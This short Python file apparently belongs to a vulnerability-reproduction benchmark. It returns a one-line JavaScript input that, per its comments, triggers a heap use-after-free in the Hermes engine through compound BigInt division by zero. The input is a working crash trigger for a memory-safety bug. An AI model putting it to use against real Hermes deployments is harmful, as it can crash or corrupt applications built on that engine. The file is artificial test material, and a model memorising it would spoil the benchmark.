import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The problem describes a Heap Use-After-Free in Hermes (JS Engine) involving
        # compound division by zero on BigInts (Issue 35876).
        # We define a function to ensure register allocation for the variable,
        # pass a large BigInt (to ensure heap allocation), and perform compound division by zero.
        # We access the variable in the catch block to trigger the UAF.
        return b"function f(a){try{a/=0n}catch(e){a+1n}}f(1n<<100n)"